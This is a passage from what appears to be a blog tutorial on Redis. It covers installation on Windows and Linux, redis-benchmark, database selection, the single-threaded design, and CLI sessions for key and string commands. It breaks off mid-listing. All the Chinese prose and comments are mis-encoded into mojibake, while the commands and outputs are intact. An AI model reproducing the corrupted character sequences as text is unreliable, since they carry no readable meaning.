<p>redisèƒ½å¹²å˜›ï¼Ÿ</p>
</blockquote>
<ol>
<li>å†…å­˜å­˜å‚¨ã€æŒä¹…åŒ–ï¼Œå†…å­˜ä¸­æ˜¯æ–­ç”µå³å¤±ã€æ‰€ä»¥è¯´æŒä¹…åŒ–å¾ˆé‡è¦ï¼ˆrdbï¼Œaofï¼‰</li>
<li>æ•ˆç‡é«˜ï¼Œå¯ä»¥ç”¨äºé«˜é€Ÿç¼“å­˜</li>
<li>å‘å¸ƒè®¢é˜…ç³»ç»Ÿ</li>
<li>åœ°å›¾ä¿¡æ¯åˆ†æ</li>
<li>è®¡æ—¶å™¨ã€è®¡æ•°å™¨ï¼ˆæµè§ˆé‡ï¼ï¼‰</li>
<li>â€¦</li>
</ol>
<blockquote>
<p>ç‰¹æ€§</p>
</blockquote>
<ol>
<li>å¤šæ ·çš„æ•°æ®ç±»å‹</li>
<li>æŒä¹…åŒ–</li>
<li>é›†ç¾¤</li>
<li>äº‹åŠ¡</li>
<li>â€¦</li>
</ol>
<blockquote>
<p>å­¦ä¹ ä¸­ç”¨åˆ°çš„ä¸œè¥¿</p>
</blockquote>
<ol>
<li><p>å®˜ç½‘ï¼š<a href="https://redis.io/">https://redis.io/</a></p>
</li>
<li><p>ä¸­æ–‡ç½‘ï¼š<a href="http://www.redis.cn/">http://www.redis.cn/</a></p>
</li>
<li><p>ä¸‹è½½åœ°å€ï¼š<a href="https://redis.io/download/">https://redis.io/download/</a></p>
<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-09-17/3d70629585eeb9924216c692083c3396--b22c--image-20240917205651085.png" alt="image-20240917205651085"></p>
<p>æ³¨æ„ï¼šWdinowåœ¨ Githubä¸Šä¸‹è½½ï¼ˆåœæ›´å¾ˆä¹…äº†ï¼ï¼‰</p>
<p>Redisæ¨èéƒ½æ˜¯åœ¨LinuxæœåŠ¡å™¨ä¸Šæ­å»ºçš„ï¼Œæˆ‘ä»¬æ˜¯åŸºäºLinuxå­¦ä¹ ï¼</p>
</li>
</ol>
<h2 id="2ã€WIndowsä¸‹Redisçš„å®‰è£…"><a href="#2ã€WIndowsä¸‹Redisçš„å®‰è£…" class="headerlink" title="2ã€WIndowsä¸‹Redisçš„å®‰è£…"></a>2ã€WIndowsä¸‹Redisçš„å®‰è£…</h2><p>1ã€ä¸‹è½½å‹ç¼©åŒ…ç›´æ¥ä½¿ç”¨å³å¯ã€‚ä¸‹è½½åœ°å€ï¼š<a href="https://github.com/tporadowski/redis/releases">https://github.com/tporadowski/redis/releases</a></p>
<p>2ã€æ‰“å¼€serveræœåŠ¡ï¼Œå†ä½¿ç”¨clientå»è¿æ¥ï¼Œå³å¯ç›´æ¥å‘½ä»¤è¡Œä½¿ç”¨ã€‚</p>
<blockquote>
<p>è®°ä½ä¸€å¥è¯ï¼ŒWindowä¸‹ä½¿ç”¨ç¡®å®ç®€å•ï¼Œä½†æ˜¯Redis æ¨èæˆ‘ä»¬ä½¿ç”¨Linuxå»å¼€å‘ä½¿ç”¨ï¼</p>
</blockquote>
<h2 id="3ã€Linuxå®‰è£…"><a href="#3ã€Linuxå®‰è£…" class="headerlink" title="3ã€Linuxå®‰è£…"></a>3ã€Linuxå®‰è£…</h2><ul>
<li>ç›´æ¥æ‰¾åˆ°å®˜ç½‘é“¾æ¥å¯¹åº”çš„ä¸‹è½½å®‰è£…æ–¹æ³•   é“¾æ¥ï¼š<a href="https://redis.io/docs/latest/operate/oss_and_stack/install/install-redis/install-redis-on-linux/">https://redis.io/docs/latest/operate/oss_and_stack/install/install-redis/install-redis-on-linux/</a></li>
<li>ä½¿ç”¨snapå†Ubuntuä¸Šå®‰è£…</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo apt update</span><br><span class="line">sudo apt install redis-tools <span class="comment"># for redis-cli</span></span><br><span class="line">sudo snap install redis</span><br></pre></td></tr></table></figure>

<ul>
<li>ä¸€äº›å¸¸è§çš„snapæ“ä½œredisçš„å‘½ä»¤</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo snap start redis</span><br><span class="line">sudo snap stop redis</span><br><span class="line">sudo snap restart redis</span><br><span class="line">sudo snap services redis</span><br></pre></td></tr></table></figure>

<ul>
<li>ä½†è¿™é‡Œæˆ‘ä»¬å°±ä¸ä½¿ç”¨è¿™ç§æ–¹å¼äº†ï¼Œæˆ‘ä»¬å¯ä»¥å»è‡ªå·±ä¸‹è½½å¯¹åº”çš„æºç ç¼–è¯‘</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">wget https://download.redis.io/redis-stable.tar.gz</span><br><span class="line"></span><br><span class="line">tar -zxvf redis-stable.tar.gz</span><br><span class="line"></span><br><span class="line">make</span><br><span class="line"></span><br><span class="line">make install</span><br></pre></td></tr></table></figure>

<ul>
<li>ç„¶åå°±æ˜¯å¯ä»¥è¿›å…¥æˆ‘ä»¬é»˜è®¤çš„å®‰è£…è·¯å¾„<code>/usr/local/bin/</code>ï¼Œå¯ä»¥å‘ç°å·²ç»æˆåŠŸå®‰è£…ä¸Šäº†</li>
</ul>
<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-09-18/08fda3803d6cf30473591657d682416a--379d--image-20240918162219684.png" alt="image-20240918162219684"></p>
<ul>
<li>ç„¶åæˆ‘ä»¬å°±å¯ä»¥å»åˆ›å»ºä¸€ä¸ªæ–‡ä»¶å¤¹ä¸“é—¨å»å­˜æ”¾æˆ‘ä»¬çš„é…ç½®æ–‡ä»¶ï¼Œæ–¹ä¾¿æˆ‘ä»¬ä¹‹åçš„ä½¿ç”¨</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">mkdir</span> myconfig</span><br><span class="line"></span><br><span class="line"><span class="built_in">cp</span> /home/ubuntu/tools/redis/redis-stable/redis.conf myconfig/</span><br></pre></td></tr></table></figure>

<ul>
<li>ä¿®æ”¹é…ç½®æ–‡ä»¶ï¼Œå¼€å¯å®ˆæŠ¤è¿›ç¨‹ï¼Œä½¿redisèƒ½å¤Ÿåœ¨åå°è¿è¡Œ</li>
</ul>
<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-09-18/ba0c73fe44558e4c53d074f59bfb16d9--1e37--image-20240918162915219.png" alt="image-20240918162915219"></p>
<ul>
<li>ä½¿ç”¨æˆ‘ä»¬è‡ªå·±çš„é…ç½®æ–‡ä»¶å»å¯åŠ¨redisæœåŠ¡</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">root@VM-16-10-ubuntu:/usr/local/bin# redis-server myconfig/redis.conf</span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-09-18/b350fb9a014f081cc57605c128f8a231--84f1--image-20240918163216764.png" alt="image-20240918163216764"></p>
<ul>
<li>æˆåŠŸå®Œæˆå¯åŠ¨å’Œè¿æ¥</li>
</ul>
<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-09-18/e2619002790475090bd5f274f37086ae--742f--image-20240918163307637.png" alt="image-20240918163307637"></p>
<ul>
<li>å…³é—­rediså¹¶é€€å‡º</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">127.0.0.1:6379&gt; shutdown</span><br><span class="line">not connected&gt; <span class="built_in">exit</span></span><br><span class="line">root@VM-16-10-ubuntu:/usr/local/bin<span class="comment"># </span></span><br></pre></td></tr></table></figure>

<h2 id="4ã€å‹åŠ›æµ‹è¯•"><a href="#4ã€å‹åŠ›æµ‹è¯•" class="headerlink" title="4ã€å‹åŠ›æµ‹è¯•"></a>4ã€å‹åŠ›æµ‹è¯•</h2><ul>
<li>redis-benchmarkæ˜¯ä¸€ä¸ªå‹åŠ›æµ‹è¯•å·¥å…·</li>
<li>å®˜æ–¹è‡ªå¸¦çš„æ€§èƒ½æµ‹è¯•å·¥å…·</li>
</ul>
<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-09-18/1cd8394c333815e2933deb276bc14f2c--d917--image-20240918163836563.png" alt="image-20240918163836563"></p>
<p>æˆ‘ä»¬æ¥ç®€å•æµ‹è¯•ä¸€ä¸‹</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">æµ‹è¯•100ä¸ªå¹¶å‘ï¼Œ100ä¸ªè¯·æ±‚</span><br><span class="line">redis-benchmark -h localhost -p 6379 -c 100 -n 100</span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-09-18/292b8273c8c6db63fe7d6bf7d2d3e327--6b75--image-20240918164542352.png" alt="image-20240918164542352"></p>
<p>ä¸­é—´çš„éƒ¨åˆ†å°±æ˜¯ä¸åŒæ¯«ç§’æ—¶å¤„ç†æ€»æ•°æ®çš„ç™¾åˆ†æ¯”ä»¥åŠå»¶è¿Ÿï¼›æœ€åçš„éƒ¨åˆ†å°±æ˜¯ç®—å‡ºçš„å¹³å‡ååé‡äº†ã€‚æ€»ä½“æ¥è¯´ï¼Œååé€Ÿåº¦è¿˜æ˜¯å¾ˆä¸é”™çš„ã€‚</p>
<h2 id="5ã€åŸºç¡€çŸ¥è¯†"><a href="#5ã€åŸºç¡€çŸ¥è¯†" class="headerlink" title="5ã€åŸºç¡€çŸ¥è¯†"></a>5ã€åŸºç¡€çŸ¥è¯†</h2><ul>
<li>redisé»˜è®¤æœ‰16ä¸ªæ•°æ®åº“ï¼Œè¿™å¯ä»¥åœ¨redis.confé…ç½®æ–‡ä»¶ä¸­å¯ä»¥çœ‹åˆ°</li>
<li>å¯ä»¥åœ¨é…ç½®æ–‡ä»¶ä¸­ä¿®æ”¹databasesçš„å€¼å»ä¿®æ”¹é»˜è®¤çš„æ•°æ®åº“çš„æ•°é‡</li>
<li>æ•°æ®åº“é»˜è®¤ä½¿ç”¨çš„æ˜¯ç¬¬0ä¸ªæ•°æ®åº“</li>
<li>redisä½¿ç”¨æ—¶å¯ä»¥ä½¿ç”¨selectå»åˆ‡æ¢æ•°æ®åº“</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">127.0.0.1:6379&gt; dbsize <span class="comment"># æŸ¥çœ‹dbå¤§å°</span></span><br><span class="line">(<span class="built_in">integer</span>) 9</span><br><span class="line">127.0.0.1:6379&gt; keys * <span class="comment"># æŸ¥çœ‹å½“å‰æ•°æ®åº“æ‰€æœ‰çš„key</span></span><br><span class="line">1) <span class="string">&quot;key:__rand_int__&quot;</span></span><br><span class="line">2) <span class="string">&quot;c&quot;</span></span><br><span class="line">3) <span class="string">&quot;b&quot;</span></span><br><span class="line">4) <span class="string">&quot;mystream&quot;</span></span><br><span class="line">5) <span class="string">&quot;myhash&quot;</span></span><br><span class="line">6) <span class="string">&quot;counter:__rand_int__&quot;</span></span><br><span class="line">7) <span class="string">&quot;a&quot;</span></span><br><span class="line">8) <span class="string">&quot;d&quot;</span></span><br><span class="line">9) <span class="string">&quot;mylist&quot;</span></span><br><span class="line">127.0.0.1:6379&gt; <span class="keyword">select</span> 3 <span class="comment"># åˆ‡æ¢è‡³3å·æ•°æ®åº“</span></span><br><span class="line">OK</span><br><span class="line">127.0.0.1:6379[3]&gt; <span class="comment"># åˆ‡æ¢æˆåŠŸ</span></span><br></pre></td></tr></table></figure>

<ul>
<li><p>æ¸…ç©ºå½“å‰æ•°æ®åº“<code>flushdb</code></p>
</li>
<li><p>æ¸…é™¤æ‰€æœ‰æ•°æ®åº“<code>flushall</code></p>
</li>
</ul>
<blockquote>
<p>Redis æ˜¯å•çº¿ç¨‹çš„ï¼</p>
</blockquote>
<p>æ˜ç™½Redisæ˜¯å¾ˆå¿«çš„ï¼Œå®˜æ–¹è¡¨ç¤ºï¼Œ<strong>Redisæ˜¯åŸºäºå†…å­˜æ“ä½œï¼ŒCPUä¸æ˜¯Redisæ€§èƒ½ç“¶é¢ˆï¼ŒRedisçš„ç“¶é¢ˆæ˜¯æ ¹æ®æœºå™¨çš„å†…å­˜å’Œç½‘ç»œå¸¦å®½</strong>ï¼Œæ—¢ç„¶å¯ä»¥ä½¿ç”¨å•çº¿ç¨‹æ¥å®ç°ï¼Œå°±ä½¿ç”¨å•çº¿ç¨‹äº†ï¼æ‰€ä»¥å°±ä½¿ç”¨äº†å•çº¿ç¨‹äº†ï¼</p>
<p>Redis æ˜¯C è¯­è¨€å†™çš„ï¼Œå®˜æ–¹æä¾›çš„æ•°æ®ä¸º 10W+ çš„QPSï¼Œå®Œå…¨ä¸æ¯”åŒæ ·æ˜¯ä½¿ç”¨ key-valeçš„Memecacheå·®ï¼</p>
<p><strong>Redisä¸ºä»€ä¹ˆå•çº¿ç¨‹è¿˜è¿™ä¹ˆå¿«ï¼Ÿ</strong></p>
<p>1ã€è¯¯åŒº1ï¼šé«˜æ€§èƒ½çš„æœåŠ¡å™¨ä¸€å®šæ˜¯å¤šçº¿ç¨‹çš„ï¼Ÿ</p>
<p>2ã€è¯¯åŒº2ï¼šå¤šçº¿ç¨‹ï¼ˆCPUä¸Šä¸‹æ–‡ä¼šåˆ‡æ¢ï¼ï¼‰ä¸€å®šæ¯”å•çº¿ç¨‹æ•ˆç‡é«˜ï¼</p>
<p>é€Ÿåº¦ï¼šCPU&gt;å†…å­˜&gt;ç¡¬ç›˜</p>
<p>æ ¸å¿ƒï¼šredis æ˜¯å°†æ‰€æœ‰çš„æ•°æ®å…¨éƒ¨æ”¾åœ¨å†…å­˜ä¸­çš„ï¼Œæ‰€ä»¥è¯´ä½¿ç”¨å•çº¿ç¨‹å»æ“ä½œæ•ˆç‡å°±æ˜¯æœ€é«˜çš„ï¼Œ</p>
<p>å¤šçº¿ç¨‹ï¼ˆCPUä¸Šä¸‹æ–‡ä¼šåˆ‡æ¢ï¼šè€—æ—¶çš„æ“ä½œï¼ï¼ï¼ï¼‰ï¼Œå¯¹äºå†…å­˜ç³»ç»Ÿæ¥è¯´ï¼Œå¦‚æœæ²¡æœ‰ä¸Šä¸‹æ–‡åˆ‡æ¢æ•ˆç‡å°±æ˜¯æœ€é«˜çš„ï¼</p>
<p>å¤šæ¬¡è¯»å†™éƒ½æ˜¯åœ¨ä¸€ä¸ªCPUä¸Šçš„ï¼Œåœ¨å†…å­˜æƒ…å†µä¸‹ï¼Œè¿™ä¸ªå°±æ˜¯æœ€ä½³çš„æ–¹æ¡ˆï¼</p>
<h1 id="ä¸‰ã€äº”å¤§æ•°æ®ç±»å‹"><a href="#ä¸‰ã€äº”å¤§æ•°æ®ç±»å‹" class="headerlink" title="ä¸‰ã€äº”å¤§æ•°æ®ç±»å‹"></a>ä¸‰ã€äº”å¤§æ•°æ®ç±»å‹</h1><p>Redis æ˜¯ä¸€ä¸ªå¼€æºï¼ˆBSDè®¸å¯ï¼‰çš„ï¼Œå†…å­˜ä¸­çš„æ•°æ®ç»“æ„å­˜å‚¨ç³»ç»Ÿï¼Œå®ƒå¯ä»¥ç”¨ä½œæ•°æ®åº“ã€ç¼“å­˜å’Œæ¶ˆæ¯ä¸­é—´ä»¶MQã€‚ å®ƒæ”¯æŒå¤šç§ç±»å‹çš„æ•°æ®ç»“æ„ï¼Œå¦‚ å­—ç¬¦ä¸²ï¼ˆstringsï¼‰ï¼Œ æ•£åˆ—ï¼ˆhashesï¼‰ï¼Œ åˆ—è¡¨ï¼ˆlistsï¼‰ï¼Œ é›†åˆï¼ˆsetsï¼‰ï¼Œ æœ‰åºé›†åˆï¼ˆsorted setsï¼‰ ä¸èŒƒå›´æŸ¥è¯¢ï¼Œ bitmapsï¼Œ hyperloglogs å’Œ åœ°ç†ç©ºé—´ï¼ˆgeospatialï¼‰ ç´¢å¼•åŠå¾„æŸ¥è¯¢ã€‚ Redis å†…ç½®äº† å¤åˆ¶ï¼ˆreplicationï¼‰ï¼ŒLUAè„šæœ¬ï¼ˆLua scriptingï¼‰ï¼Œ LRUé©±åŠ¨äº‹ä»¶ï¼ˆLRU evictionï¼‰ï¼Œäº‹åŠ¡ï¼ˆtransactionsï¼‰ å’Œä¸åŒçº§åˆ«çš„ ç£ç›˜æŒä¹…åŒ–ï¼ˆpersistenceï¼‰ï¼Œ å¹¶é€šè¿‡Rediså“¨å…µï¼ˆSentinelï¼‰å’Œè‡ªåŠ¨ åˆ†åŒºï¼ˆClusterï¼‰æä¾›é«˜å¯ç”¨æ€§ï¼ˆhigh availabilityï¼‰ã€‚</p>
<h2 id="1ã€å¸¸è§å‘½ä»¤"><a href="#1ã€å¸¸è§å‘½ä»¤" class="headerlink" title="1ã€å¸¸è§å‘½ä»¤"></a>1ã€å¸¸è§å‘½ä»¤</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">127.0.0.1:6379[3]&gt; keys *  <span class="comment"># æŸ¥çœ‹æ‰€æœ‰çš„key</span></span><br><span class="line">(empty array)</span><br><span class="line">127.0.0.1:6379[3]&gt; clear <span class="comment"># æ¸…å±</span></span><br><span class="line">127.0.0.1:6379[3]&gt; <span class="built_in">set</span> name zyy <span class="comment"># set key</span></span><br><span class="line">OK</span><br><span class="line">127.0.0.1:6379[3]&gt; keys *</span><br><span class="line">1) <span class="string">&quot;name&quot;</span></span><br><span class="line">127.0.0.1:6379[3]&gt; <span class="built_in">set</span> age 1</span><br><span class="line">OK</span><br><span class="line">127.0.0.1:6379[3]&gt; keys *</span><br><span class="line">1) <span class="string">&quot;age&quot;</span></span><br><span class="line">2) <span class="string">&quot;name&quot;</span></span><br><span class="line">127.0.0.1:6379[3]&gt; exists name <span class="comment"># åˆ¤æ–­keyæ˜¯å¦å­˜åœ¨ 1å­˜åœ¨ï¼Œ0ä¸å­˜åœ¨</span></span><br><span class="line">(<span class="built_in">integer</span>) 1</span><br><span class="line">127.0.0.1:6379[3]&gt; exists name1</span><br><span class="line">(<span class="built_in">integer</span>) 0</span><br><span class="line">127.0.0.1:6379[3]&gt; move name 1 <span class="comment"># å°†keyç§»åŠ¨åˆ°1å·æ•°æ®åº“</span></span><br><span class="line">(<span class="built_in">integer</span>) 1</span><br><span class="line">127.0.0.1:6379[3]&gt; keys *</span><br><span class="line">1) <span class="string">&quot;age&quot;</span></span><br><span class="line">127.0.0.1:6379[3]&gt; <span class="keyword">select</span> 1 <span class="comment"># åˆ‡æ¢1å·æ•°æ®åº“</span></span><br><span class="line">OK</span><br><span class="line">127.0.0.1:6379[1]&gt; keys *</span><br><span class="line">1) <span class="string">&quot;name&quot;</span></span><br><span class="line">127.0.0.1:6379[1]&gt; get name <span class="comment"># get value</span></span><br><span class="line"><span class="string">&quot;zyy&quot;</span></span><br><span class="line">127.0.0.1:6379[1]&gt; <span class="keyword">select</span> 3</span><br><span class="line">OK</span><br><span class="line">127.0.0.1:6379[3]&gt; keys *</span><br><span class="line">1) <span class="string">&quot;age&quot;</span></span><br><span class="line">127.0.0.1:6379[3]&gt; ttl name <span class="comment"># è¿”å›keyçš„è¿‡æœŸæ—¶é—´ï¼Œ-2 ä»£è¡¨keyä¸å­˜åœ¨ï¼Œ-1ä»£è¡¨å­˜åœ¨å¯ä»¥ï¼Œä½†æ˜¯æ²¡æœ‰è®¾ç½®è¿‡æœŸæ—¶é—´</span></span><br><span class="line">(<span class="built_in">integer</span>) -2</span><br><span class="line">127.0.0.1:6379[3]&gt; ttl age</span><br><span class="line">(<span class="built_in">integer</span>) -1</span><br><span class="line">127.0.0.1:6379[3]&gt; <span class="built_in">set</span> name3 3</span><br><span class="line">OK</span><br><span class="line">127.0.0.1:6379[3]&gt; keys *</span><br><span class="line">1) <span class="string">&quot;age&quot;</span></span><br><span class="line">2) <span class="string">&quot;name3&quot;</span></span><br><span class="line">127.0.0.1:6379[3]&gt; <span class="built_in">set</span> name zyy</span><br><span class="line">OK</span><br><span class="line">127.0.0.1:6379[3]&gt; keys *</span><br><span class="line">1) <span class="string">&quot;age&quot;</span></span><br><span class="line">2) <span class="string">&quot;name&quot;</span></span><br><span class="line">3) <span class="string">&quot;name3&quot;</span></span><br><span class="line">127.0.0.1:6379[3]&gt; expire name 10 <span class="comment">#è®¾ç½®keyçš„è¿‡æœŸæ—¶é—´ï¼Œå•ä½ç§’</span></span><br><span class="line">(<span class="built_in">integer</span>) 1</span><br><span class="line">127.0.0.1:6379[3]&gt; ttl name</span><br><span class="line">(<span class="built_in">integer</span>) 6</span><br><span class="line">127.0.0.1:6379[3]&gt; ttl name</span><br><span class="line">(<span class="built_in">integer</span>) 3</span><br><span class="line">127.0.0.1:6379[3]&gt; ttl name</span><br><span class="line">(<span class="built_in">integer</span>) 2</span><br><span class="line">127.0.0.1:6379[3]&gt; ttl name</span><br><span class="line">(<span class="built_in">integer</span>) 1</span><br><span class="line">127.0.0.1:6379[3]&gt; ttl name</span><br><span class="line">(<span class="built_in">integer</span>) 1</span><br><span class="line">127.0.0.1:6379[3]&gt; ttl name</span><br><span class="line">(<span class="built_in">integer</span>) -2</span><br><span class="line">127.0.0.1:6379[3]&gt; keys *</span><br><span class="line">1) <span class="string">&quot;age&quot;</span></span><br><span class="line">2) <span class="string">&quot;name3&quot;</span></span><br><span class="line">127.0.0.1:6379[3]&gt; <span class="built_in">type</span> age <span class="comment"># æŸ¥çœ‹keyçš„æ•°æ®ç±»å‹</span></span><br><span class="line">string</span><br><span class="line">127.0.0.1:6379[3]&gt; del k1 <span class="comment"># åˆ é™¤å·²å­˜åœ¨çš„é”®ã€‚ä¸å­˜åœ¨çš„ key ä¼šè¢«å¿½ç•¥ã€‚</span></span><br></pre></td></tr></table></figure>

<h2 id="2ã€Stringï¼ˆå­—ç¬¦ä¸²ï¼‰"><a href="#2ã€Stringï¼ˆå­—ç¬¦ä¸²ï¼‰" class="headerlink" title="2ã€Stringï¼ˆå­—ç¬¦ä¸²ï¼‰"></a>2ã€Stringï¼ˆå­—ç¬¦ä¸²ï¼‰</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#################################################</span></span><br><span class="line"><span class="comment">## è®¾ç½®å€¼ è·å–å€¼ å­—ç¬¦ä¸²é•¿åº¦  è¿½åŠ </span></span><br><span class="line">127.0.0.1:6379&gt; <span class="built_in">set</span> key1 v1 <span class="comment"># è®¾ç½®å€¼</span></span><br><span class="line">OK</span><br><span class="line">127.0.0.1:6379&gt; get key1 <span class="comment"># è·å–å€¼</span></span><br><span class="line"><span class="string">&quot;v1&quot;</span></span><br><span class="line">127.0.0.1:6379&gt; keys * <span class="comment"># æŸ¥çœ‹æ‰€æœ‰çš„key</span></span><br><span class="line">1) <span class="string">&quot;key1&quot;</span></span><br><span class="line">127.0.0.1:6379&gt; exists key1 <span class="comment"># åˆ¤æ–­keyæ˜¯å¦å­˜åœ¨ï¼Œå­˜åœ¨è¿”å›1 ï¼Œä¸å­˜åœ¨è¿”å›0</span></span><br><span class="line">(<span class="built_in">integer</span>) 1</span><br><span class="line">127.0.0.1:6379&gt; exists key2</span><br><span class="line">(<span class="built_in">integer</span>) 0</span><br><span class="line">127.0.0.1:6379&gt; append key1 <span class="string">&quot; hello&quot;</span> <span class="comment"># è¿½åŠ å­—ç¬¦ä¸²ï¼Œè¿”å›æ€»é•¿åº¦  å½“keyå­˜åœ¨å°±è¿½åŠ ï¼Œå½“keyä¸å­˜åœ¨å°±ç›¸å½“äºset key</span></span><br><span class="line">(<span class="built_in">integer</span>) 8</span><br><span class="line">127.0.0.1:6379&gt; get key1</span><br><span class="line"><span class="string">&quot;v1 hello&quot;</span></span><br><span class="line">127.0.0.1:6379&gt; strlen key1 <span class="comment"># è·å–å­—ç¬¦ä¸²çš„é•¿åº¦</span></span><br><span class="line">(<span class="built_in">integer</span>) 8</span><br><span class="line">127.0.0.1:6379&gt; strlen key2</span><br><span class="line">(<span class="built_in">integer</span>) 0</span><br><span class="line">127.0.0.1:6379&gt; keys *</span><br><span class="line">1) <span class="string">&quot;key1&quot;</span></span><br><span class="line">127.0.0.1:6379&gt; append key1 <span class="string">&quot;,zyy&quot;</span></span><br><span class="line">(<span class="built_in">integer</span>) 12</span><br><span class="line">127.0.0.1:6379&gt; strlen key1</span><br><span class="line">(<span class="built_in">integer</span>) 12</span><br><span class="line">127.0.0.1:6379&gt; append key2 <span class="string">&quot;zyy&quot;</span></span><br><span class="line">(<span class="built_in">integer</span>) 3</span><br><span class="line">127.0.0.1:6379&gt; get key1</span><br><span class="line"><span class="string">&quot;v1 hello,zyy&quot;</span></span><br><span class="line">127.0.0.1:6379&gt; get key2</span><br><span class="line"><span class="string">&quot;zyy&quot;</span></span><br><span class="line"><span class="comment">#################################################</span></span><br><span class="line"><span class="comment">## è‡ªå¢ è‡ªæ£€ ###</span></span><br><span class="line">127.0.0.1:6379&gt; <span class="built_in">set</span> views 0</span><br><span class="line">OK</span><br><span class="line">127.0.0.1:6379&gt; get views</span><br><span class="line"><span class="string">&quot;0&quot;</span></span><br><span class="line">127.0.0.1:6379&gt; incr views <span class="comment"># è‡ªå¢1 </span></span><br><span class="line">(<span class="built_in">integer</span>) 1</span><br><span class="line">127.0.0.1:6379&gt; incr views</span><br><span class="line">(<span class="built_in">integer</span>) 2</span><br><span class="line">127.0.0.1:6379&gt; get views</span><br><span class="line"><span class="string">&quot;2&quot;</span></span><br><span class="line">127.0.0.1:6379&gt; decr views <span class="comment"># è‡ªå‡1 </span></span><br><span class="line">(<span class="built_in">integer</span>) 1</span><br><span class="line">127.0.0.1:6379&gt; decr views</span><br><span class="line">(<span class="built_in">integer</span>) 0</span><br><span class="line">127.0.0.1:6379&gt; decr views</span><br><span class="line">(<span class="built_in">integer</span>) -1</span><br><span class="line">127.0.0.1:6379&gt; decr views</span><br><span class="line">(<span class="built_in">integer</span>) -2</span><br><span class="line">127.0.0.1:6379&gt; get views</span><br><span class="line"><span class="string">&quot;-2&quot;</span></span><br><span class="line">127.0.0.1:6379&gt; incrby views 10 <span class="comment"># å¯ä»¥è®¾ç½®æ­¥é•¿ï¼ŒæŒ‡å®šå¢é‡</span></span><br><span class="line">(<span class="built_in">integer</span>) 8</span><br><span class="line">127.0.0.1:6379&gt; decrby views 5</span><br><span class="line">(<span class="built_in">integer</span>) 3</span><br><span class="line"><span class="comment">#################################################</span></span><br><span class="line"><span class="comment">## æˆªå–å­—ç¬¦ä¸²  æ›¿æ¢å­—ç¬¦ä¸²</span></span><br><span class="line">127.0.0.1:6379&gt; <span class="built_in">set</span> key1 <span class="string">&quot;hello,zyy&quot;</span></span><br><span class="line">OK</span><br><span class="line">127.0.0.1:6379&gt; get key1</span><br><span class="line"><span class="string">&quot;hello,zyy&quot;</span></span><br><span class="line">127.0.0.1:6379&gt; getrange key1 0 3  <span class="comment"># æˆªå–å­—ç¬¦ä¸²[0,3]</span></span><br><span class="line"><span class="string">&quot;hell&quot;</span></span><br><span class="line">127.0.0.1:6379&gt; getrange key1 0 -1 <span class="comment"># è·å–å…¨éƒ¨å­—ç¬¦ä¸² å’Œ get key ä¸€æ ·</span></span><br><span class="line"><span class="string">&quot;hello,zyy&quot;</span></span><br><span class="line">127.0.0.1:6379&gt; <span class="built_in">set</span> key2 123456</span><br><span class="line">OK</span><br><span class="line">127.0.0.1:6379&gt; get key2</span><br><span class="line"><span class="string">&quot;123456&quot;</span></span><br><span class="line">127.0.0.1:6379&gt; setrange key2 1 bcd <span class="comment"># æ›¿æ¢æŒ‡å®šä½ç½®å¼€å§‹çš„å­—ç¬¦ä¸²</span></span><br><span class="line">(<span class="built_in">integer</span>) 6</span><br><span class="line">127.0.0.1:6379&gt; get key2</span><br><span class="line"><span class="string">&quot;1bcd56&quot;</span></span><br><span class="line">127.0.0.1:6379&gt; </span><br><span class="line"><span class="comment">#################################################</span></span><br><span class="line"><span class="comment">## è®¾ç½®è¿‡æœŸæ—¶é—´  setnxå¯ç”¨äºåˆ†å¸ƒå¼é”</span></span><br><span class="line">127.0.0.1:6379&gt; setex key1 30 <span class="string">&quot;hello&quot;</span> <span class="comment"># è®¾ç½®key1çš„å€¼ä¸ºhello å¹¶ä¸”30ç§’åè¿‡æœŸ</span></span><br><span class="line">OK</span><br><span class="line">127.0.0.1:6379&gt; ttl key1 <span class="comment"># å‰©ä½™æ—¶é—´</span></span><br><span class="line">(<span class="built_in">integer</span>) 24</span><br><span class="line">127.0.0.1:6379&gt; ttl key1</span><br><span class="line">(<span class="built_in">integer</span>) 22</span><br><span class="line">127.0.0.1:6379&gt; setnx key2 <span class="string">&quot;123&quot;</span> <span class="comment"># å¦‚æœkey2ä¸å­˜åœ¨ï¼Œå°±åˆ›å»ºkey2,åˆ›å»ºæˆåŠŸï¼Œè¿”å›1</span></span><br><span class="line">(<span class="built_in">integer</span>) 1</span><br><span class="line">127.0.0.1:6379&gt; keys *</span><br><span class="line">1) <span class="string">&quot;key2&quot;</span></span><br><span class="line">127.0.0.1:6379&gt; setnx key2 <span class="string">&quot;456&quot;</span> <span class="comment"># å¦‚æœkey2å­˜åœ¨ï¼Œå°±åˆ›å»ºkey2å¤±è´¥ï¼Œè¿”å›0</span></span><br><span class="line">(<span class="built_in">integer</span>) 0</span><br><span class="line">127.0.0.1:6379&gt; </span><br><span class="line"><span class="comment">#################################################</span></span><br><span class="line">127.0.0.1:6379&gt; mset k1 v1 k2 v2 k3 v3 <span class="comment"># åŒæ—¶è®¾ç½®å¤šä¸ªå€¼</span></span><br><span class="line">OK</span><br><span class="line">127.0.0.1:6379&gt; keys *</span><br><span class="line">1) <span class="string">&quot;k2&quot;</span></span><br><span class="line">2) <span class="string">&quot;k3&quot;</span></span><br><span class="line">3) <span class="string">&quot;k1&quot;</span></span><br><span class="line">127.0.0.1:6379&gt; mget k1 k2 k3 <span class="comment"># åŒæ—¶è·å–å¤šä¸ªå€¼</span></span><br><span class="line">1) <span 